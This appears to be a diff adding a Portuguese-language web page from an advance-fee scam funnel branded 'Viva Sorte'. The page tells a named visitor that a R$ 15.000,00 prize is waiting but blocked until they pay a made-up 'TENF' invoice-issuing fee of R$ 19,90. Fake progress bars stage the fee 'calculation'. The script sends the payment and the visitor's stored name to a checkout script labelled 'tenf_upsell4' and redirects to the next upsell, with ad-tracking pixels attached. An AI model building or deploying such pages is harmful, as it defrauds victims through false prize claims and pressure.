@@ -1,0 +1,660 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    
+    <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+<script>
+  window.pixelId = "67b55551ab32c3b13ad4ec9d";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+  <meta charset="utf-8">
+<script>
+  window.pixelId = "67ef67b0655738af4b8dbdd8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Premiação Disponível - Viva Sorte</title>
+
+  <script>
+    localStorage.setItem("upsell", "up3");
+  </script>
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+  <style>
+    * {
+      margin: 0px;
+      padding: 0px;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f2f2f2;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .card, .loading {
+      width: 100%;
+      overflow: hidden;
+    }
+
+    .topbar {
+      background-color: #2f4eb5;
+      color: white;
+      padding: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: relative;
+    }
+
+    .user-info {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 1rem;
+      font-weight: 500;
+    }
+
+    .user-info img {
+      width: 50px;
+      height: 50px;
+    }
+
+    .user-name {
+      position: absolute;
+      top: 3rem;
+      left: 1.5rem;
+      font-size: 1rem;
+      font-weight: 600;
+      margin-top: 3rem;
+    }
+
+    .icons {
+      display: flex;
+      gap: 1.5rem;
+    }
+
+    .icons img {
+      height: 24px;
+    }
+
+    .main-header {
+      background-color: #2f4eb5;
+      color: white;
+      padding: 1rem 1.5rem 2.5rem 1.5rem;
+    }
+
+    .indenizacao-info {
+      padding: 1rem;
+      text-align: start;
+      color: black;
+      font-weight: bold;
+    }
+
+    .indenizacao-info h2 {
+      font-size: 1.1rem;
+      margin-bottom: 0.5rem;
+      color: #2f4eb5;
+    }
+
+    .indenizacao-info p {
+      font-size: 1.1rem;
+      font-weight: bold;
+      color: #000;
+    }
+
+    .content {
+      padding: 1rem;
+      background-color: #fff;
+      margin: 0 1rem;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+
+    .alert {
+      background-color: #F39200;
+      color: white;
+      padding: 1rem;
+      font-weight: 400;
+      margin-bottom: 1rem;
+      border-radius: 8px;
+      font-size: 0.9rem;
+    }
+
+    .pendencia {
+      background-color: #e9f2fb;
+      padding: 1rem;
+      text-align: center;
+      border-radius: 8px;
+      margin-bottom: 1.5rem;
+      border: 1px solid #c8ddf0;
+    }
+
+    .pendencia h3 {
+      font-size: 1rem;
+      margin-bottom: 0.5rem;
+      font-weight: bold;
+      color: #2f4eb5;
+    }
+
+    .pendencia p {
+      font-size: 0.9rem;
+      line-height: 1.5;
+      color: #333;
+    }
+
+    .pendencia p strong {
+      color: #2f4eb5;
+    }
+
+    .button {
+      width: 100%;
+      background-color: #2f4eb5;
+      color: white;
+      border: none;
+      padding: 1rem;
+      font-size: 1rem;
+      font-weight: bold;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .button:hover {
+      background-color: #1e3a8a;
+    }
+
+    /* LOADING */
+    .loading {
+      display: none;
+      flex-direction: column;
+      align-items: flex-start;
+      justify-content: flex-start;
+      background-color: #fff;
+      padding: 1rem 1.5rem;
+      gap: 1rem;
+      flex: initial;
+    }
+
+    .loading.active {
+      display: flex;
+    }
+
+    .status-text {
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: #2f4eb5;
+      opacity: 1;
+      transition: opacity 0.5s ease;
+    }
+
+    .status-text.fade-out {
+      opacity: 0;
+    }
+
+    .progress-bar {
+      width: 100%;
+      max-width: 400px;
+      height: 6px;
+      background-color: #e0e0e0;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background-color: #2f4eb5;
+      transition: width 0.1s linear;
+    }
+
+    /* Tela Final */
+    .final {
+      display: none;
+      flex-direction: column;
+      padding: 1.5rem;
+      gap: 1.5rem;
+      background-color: #fff;
+    }
+
+    .summary-card {
+      border: 2px solid #2f4eb5;
+      border-radius: 8px;
+      padding: 1rem;
+      text-align: center;
+    }
+
+    .summary-card h2 {
+      font-size: 1rem;
+      color: black;
+      margin-bottom: 0.5rem;
+    }
+
+    .summary-card p {
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: black;
+    }
+
+    .info-box {
+      background-color: #efefef;
+      border-radius: 8px;
+      padding: 1rem;
+      font-size: 0.9rem;
+      color: #333;
+      line-height: 1.5;
+      text-align: center;
+    }
+
+    .final-button {
+      width: 100%;
+      background-color: #00c851;
+      color: white;
+      border: none;
+      padding: 1rem;
+      font-size: 1rem;
+      font-weight: bold;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .final-button:hover {
+      background-color: #00923c;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- CARD PRINCIPAL -->
+  <div class="card active" id="card">
+    <div class="topbar">
+      <div class="user-info">
+        <img src="https://www.pngplay.com/wp-content/uploads/12/User-Avatar-Profile-PNG-Pic-Clip-Art-Background.png" alt="Avatar">
+      </div>
+      <div class="icons">
+        <img src="images/3.svg" alt="icons">
+        <img src="images/4.svg" alt="icons">
+        <img src="images/5.svg" alt="icons">
+      </div>
+      <div class="user-name"><strong>Olá, Rafael</strong></div>
+    </div>
+
+    <div class="main-header"></div>
+
+    <!-- LOADING -->
+    <div class="loading" id="loading">
+      <div class="progress-bar">
+        <div class="progress-bar-fill" id="bar"></div>
+      </div>
+      <h2 class="status-text" id="status-text">Calculando sua Taxa TENF...</h2>
+    </div>
+
+    <div class="content-initial">
+      <div class="indenizacao-info">
+        <h2>Premiação disponível</h2>
+        <p>R$ 15.000,00</p>
+      </div>
+
+      <div class="content">
+        <div class="alert">
+          Atenção! <strong>Rafael dos Santos Almeida</strong>, leia a mensagem abaixo para liberar sua Premiação
+        </div>
+
+        <div class="pendencia">
+          <h3>Pendência encontrada!</h3>
+          <p>
+            Para você receber o seu valor, é obrigatório realizar o pagamento do <strong>TENF (Taxa de Emissão de Nota Fiscal).</strong> 
+            O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. 
+            Clique no botão abaixo para calcular sua taxa TENF.
+          </p>
+        </div>
+
+        <button class="button" onclick="calcularTaxa()">Calcular TAXA</button>
+      </div>
+    </div>
+
+    <div class="final" id="final">
+      <div class="summary-card">
+        <h2>TENF (Taxa de Emissão de Nota Fiscal)</h2>
+        <p>R$ 19,90</p>
+      </div>
+
+      <div class="info-box">
+        Para você receber o seu valor, é obrigatório realizar o pagamento do TENF (Taxa de Emissão de Nota Fiscal). 
+        O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. Após o pagamento, 
+        a transferência será feita para sua chave PIX cadastrada. 
+        Caso não conclua o pagamento, sua Premiação será bloqueada.
+      </div>
+
+      <button class="final-button" onclick="efetuarPagamento()">Efetuar o pagamento</button>
+    </div>
+  </div>
+
+  <!-- Modal de Loading -->
+  <div id="loadingModal" class="loading-modal">
+    <div class="loading-content">
+      <img src="../images/viva.png" class="loading-logo" alt="Logo Viva Sorte">
+      <div class="loading-spinner">
+        <div class="spinner"></div>
+      </div>
+      <h3 id="loadingText" class="loading-text">Processando TENF...</h3>
+      <p class="loading-subtitle">Aguarde, não feche esta página</p>
+      <div class="loading-progress">
+        <div class="progress-bar-loading">
+          <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <span class="progress-text" id="progressText">0%</span>
+      </div>
+    </div>
+  </div>
+
+  <style>
+  .loading-modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.8);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .loading-modal.show {
+    display: flex;
+  }
+
+  .loading-content {
+    background: white;
+    border-radius: 12px;
+    padding: 2rem;
+    text-align: center;
+    max-width: 400px;
+    width: 90%;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+  }
+
+  .loading-logo {
+    width: 100px;
+    margin-bottom: 1.5rem;
+  }
+
+  .loading-spinner {
+    margin: 1rem 0;
+  }
+
+  .spinner {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #2f4eb5;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 1s linear infinite;
+    margin: 0 auto;
+  }
+
+  .loading-text {
+    color: #2f4eb5;
+    font-size: 1.3rem;
+    font-weight: 600;
+    margin: 1rem 0 0.5rem 0;
+  }
+
+  .loading-subtitle {
+    color: #666;
+    font-size: 0.9rem;
+    margin-bottom: 1.5rem;
+  }
+
+  .loading-progress {
+    margin-top: 1rem;
+  }
+
+  .progress-bar-loading {
+    width: 100%;
+    height: 8px;
+    background-color: #e0e0e0;
+    border-radius: 4px;
+    overflow: hidden;
+    margin-bottom: 0.5rem;
+  }
+
+  .progress-fill {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #2f4eb5, #1e3a8a);
+    transition: width 0.3s ease;
+  }
+
+  .progress-text {
+    font-size: 0.9rem;
+    color: #2f4eb5;
+    font-weight: 600;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+  </style>
+
+  <script>
+    // Obter dados do localStorage
+    let nomeCompleto = "Nome não informado";
+    let cpf = "";
+
+    try {
+      const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
+      if (dadosUsuario) {
+        nomeCompleto = dadosUsuario.nome || "Nome não informado";
+        cpf = dadosUsuario.cpf || "";
+      }
+      console.log('Dados carregados do localStorage:', dadosUsuario);
+    } catch (error) {
+      console.error('Erro ao carregar dados do localStorage:', error);
+      // Fallback para URL se localStorage não funcionar
+      const params = new URLSearchParams(window.location.search);
+      nomeCompleto = params.get("nome") || "Nome não informado";
+    }
+
+    const primeiroNome = nomeCompleto.trim().split(" ")[0];
+
+    document.querySelector(".user-name").innerHTML = `<strong>Olá, ${primeiroNome}</strong>`;
+    document.querySelector(".alert strong").textContent = nomeCompleto;
+
+    function calcularTaxa() {
+      document.querySelector(".content-initial").style.display = "none";
+      document.getElementById("loading").classList.add("active");
+
+      const bar = document.getElementById("bar");
+      const statusText = document.getElementById("status-text");
+      let progress = 0;
+      let trocado = false;
+
+      const interval = setInterval(() => {
+        if (progress >= 100) {
+          clearInterval(interval);
+          document.getElementById("loading").classList.remove("active");
+          document.getElementById("final").style.display = "flex";
+        } else {
+          progress++;
+          bar.style.width = progress + "%";
+
+          if (progress === 70 && !trocado) {
+            trocado = true;
+            statusText.classList.add('fade-out');
+            setTimeout(() => {
+              statusText.textContent = "Gerando seu comprovante...";
+              statusText.classList.remove('fade-out');
+            }, 500);
+          }
+        }
+      }, 30);
+    }
+
+    function efetuarPagamento() {
+      // Mostrar modal de loading
+      const loadingModal = document.getElementById('loadingModal');
+      const progressFill = document.getElementById('progressFill');
+      const progressText = document.getElementById('progressText');
+      const loadingText = document.getElementById('loadingText');
+      
+      loadingModal.classList.add('show');
+      
+      // Simular progresso inicial
+      let progress = 0;
+      const progressInterval = setInterval(() => {
+        if (progress < 30) {
+          progress += Math.random() * 5;
+          progressFill.style.width = progress + '%';
+          progressText.textContent = Math.round(progress) + '%';
+        }
+      }, 100);
+      
+      // Capturar parâmetros UTM da URL (REMOVENDO o ID anterior se existir)
+      const urlParams = new URLSearchParams(window.location.search);
+      
+      // IMPORTANTE: Remover o parâmetro 'id' para evitar conflito com transação anterior
+      urlParams.delete('id');
+      
+      const utmParams = {
+          utm_source: urlParams.get('utm_source') || '',
+          utm_medium: urlParams.get('utm_medium') || '',
+          utm_campaign: urlParams.get('utm_campaign') || '',
+          utm_content: urlParams.get('utm_content') || '',
+          utm_term: urlParams.get('utm_term') || '',
+          xcod: urlParams.get('xcod') || '',
+          sck: urlParams.get('sck') || ''
+      };
+      
+      // Criar FormData para enviar parâmetros
+      const formData = new FormData();
+      
+      // Obter dados do localStorage para nome e CPF
+      let nomeCliente = 'Cliente TENF';
+      try {
+          const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
+          if (dadosUsuario && dadosUsuario.nome) {
+              nomeCliente = dadosUsuario.nome;
+          }
+      } catch (error) {
+          console.error('Erro ao carregar dados do localStorage para pagamento:', error);
+      }
+      
+      // Adicionar valor e dados do produto ao FormData
+      formData.append('valor', 1990);
+      formData.append('nome', nomeCliente);
+      formData.append('whatsapp', '(11) 99999-9999');
+      formData.append('produto', 'tenf_upsell4'); // Identificador específico para o upsell4
+      
+      // Adicionar timestamp para garantir transação única
+      formData.append('timestamp', Date.now());
+      
+      // Adicionar parâmetros UTM ao FormData
+      Object.keys(utmParams).forEach(key => {
+          if (utmParams[key]) {
+              formData.append(key, utmParams[key]);
+          }
+      });
+      
+      console.log('Enviando dados para pagamento:', {
+          valor: 1990,
+          nome: nomeCliente,
+          produto: 'tenf_upsell4'
+      });
+      
+      // Atualizar progresso para 50%
+      setTimeout(() => {
+        clearInterval(progressInterval);
+        progress = 50;
+        progressFill.style.width = progress + '%';
+        progressText.textContent = progress + '%';
+        loadingText.textContent = 'Validando dados...';
+      }, 1000);
+      
+      // Fazer requisição para pagamento.php
+      fetch('../checkoutup3/pagamento.php', {
+          method: 'POST',
+          body: formData
+      })
+          .then(response => {
+              // Progresso 70%
+              progress = 70;
+              progressFill.style.width = progress + '%';
+              progressText.textContent = progress + '%';
+              loadingText.textContent = 'Gerando TENF...';
+              
+              if (!response.ok) {
+                  throw new Error('Erro ao processar pagamento');
+              }
+              return response.json();
+          })
+          .then(data => {
+              console.log('Resposta do pagamento:', data);
+              
+              // Progresso 90%
+              progress = 90;
+              progressFill.style.width = progress + '%';
+              progressText.textContent = progress + '%';
+              loadingText.textContent = 'Finalizando...';
+              
+              // Redirecionar para a página de checkout com os dados do pagamento
+              if (data.token) {
+                  // Progresso 100%
+                  setTimeout(() => {
+                    progress = 100;
+                    progressFill.style.width = progress + '%';
+                    progressText.textContent = progress + '%';
+                    loadingText.textContent = 'Redirecionando...';
+                    
+                    // Capturar parâmetros UTM atuais da URL (SEM o ID anterior)
+                    const urlParamsClean = new URLSearchParams(window.location.search);
+                    urlParamsClean.delete('id'); // Remove o ID anterior
+                    const currentParams = urlParamsClean.toString();
+                    
+                    // Criar URL limpa com apenas o novo ID
+                    const checkoutUrl = currentParams ? `../checkoutup2/?id=${data.token}&${currentParams}` : `../checkoutup2/?id=${data.token}`;
+                    
+                    console.log('Redirecionando para nova transação TENF:', checkoutUrl);
+                    
+                    // Aguardar um pouco antes de redirecionar
+                    setTimeout(() => {
+                      window.location.href = checkoutUrl;
+                    }, 800);
+                  }, 500);
+              } else {
+                  throw new Error('Token de transação não encontrado na resposta');
+              }
+          })
+          .catch(error => {
+              console.error('Erro:', error);
+              clearInterval(progressInterval);
+              loadingModal.classList.remove('show');
+              alert('Ocorreu um erro ao processar o pagamento. Por favor, tente novamente.');
+          });
+    }
+  </script>
+
+
+
+</body></html>
